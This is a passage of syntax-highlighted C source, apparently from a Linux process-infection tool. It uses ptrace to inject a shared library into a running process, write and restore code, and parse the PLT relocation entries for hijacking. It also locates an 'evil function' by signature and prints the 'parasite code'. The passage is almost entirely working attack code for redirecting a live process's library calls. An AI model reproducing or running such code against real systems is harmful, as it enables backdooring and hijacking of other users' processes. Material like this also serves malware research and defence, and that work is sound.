&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_CONT, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* check where eip is now at */</span>&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip is now at 0x%x, resetting it to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, reg.<span style="color: #202020;">eip</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"inserting original code back<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>saved_text + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get base addr of our mmap'd lib */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* this parses/pulls the R_386_JUMP_SLOT relocation entries from our process */</span><br>
<br>
<span style="color: #993333;">struct</span> linking_info * get_plt<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr *shdr, *shdrp, *symshdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym *syms, *symsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Rel *rel;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> *symbol;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, symcount, k;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *link;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdrp = shdr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdrp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>shdrp-&gt;sh_type == SHT_DYNSYM<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symshdr = &amp;shdr<span style="color: black;">[</span>shdrp-&gt;sh_link<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>symbol = malloc<span style="color: black;">(</span>symshdr-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>symbol, <span style="color: black;">(</span>mem + symshdr-&gt;sh_offset<span style="color: black;">)</span>, symshdr-&gt;sh_size<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>syms = <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>malloc<span style="color: black;">(</span>shdrp-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span><span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>syms, <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdrp-&gt;sh_offset<span style="color: black;">)</span>, shdrp-&gt;sh_size<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symsp = syms;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symcount = <span style="color: black;">(</span>shdrp-&gt;sh_size / <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Sym<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>malloc<span style="color: black;">(</span><span style="color: #993333;">sizeof</span><span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info<span style="color: black;">)</span> * symcount<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span> = symcount;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; symcount; j++, symsp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, &amp;symbol<span style="color: black;">[</span>symsp-&gt;st_name<span style="color: black;">]</span>, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">index</span> = j;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span><span style="color: black;">(</span>shdr-&gt;sh_type<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_REL:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rel = <span style="color: black;">(</span>Elf32_Rel *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdr-&gt;sh_offset<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; shdr-&gt;sh_size; j += <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Rel<span style="color: black;">)</span>, rel++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>k = <span style="color: #cc66cc;">0</span>; k &lt; symcount; k++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ELF32_R_SYM<span style="color: black;">(</span>rel-&gt;r_info<span style="color: black;">)</span> == link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">index</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> = rel-&gt;r_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_RELA:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span>:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fatal:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #000000; font-weight: bold;">NULL</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> search_evil_lib<span style="color: black;">(</span><span style="color: #993333;">int</span> pid, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> vaddr<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i = <span style="color: #cc66cc;">0</span>, ret;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> j = <span style="color: #cc66cc;">0</span>, c = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evilvaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>buf = malloc<span style="color: black;">(</span>LIBSIZE<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"malloc"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ret = memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>buf, vaddr, LIBSIZE, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Searching at library base [0x%x] for evil function<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; LIBSIZE; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>buf<span style="color: black;">[</span>i<span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+4</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+5</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+6</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">6</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+7</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;evilvaddr = <span style="color: black;">(</span>vaddr + i<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; c = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; j = evilvaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Printing parasite code -&gt;<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>j++ &lt; evilvaddr + <span style="color: #cc66cc;">50</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>c++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, buf<span style="color: black;">[</span>i++<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evilvaddr<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span>evilvaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span> check_for_lib<span style="color: black;">(</span><span style="color: #993333;">char</span> *lib, FILE *fd<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">while</span><span style="color: black;">(</span>fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strstr<span style="color: black;">(</span>buf, lib<span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span> main<span style="color: black;">(</span><span style="color: #993333;">int</span> argc, <span style="color: #993333;">char</span> **argv<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">char</span> meminfo<span style="color: black;">[</span><span style="color: #cc66cc;">20</span><span style="color: black;">]</span>, ps<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span>, buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>, tmp<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>, *p, *file;<br>
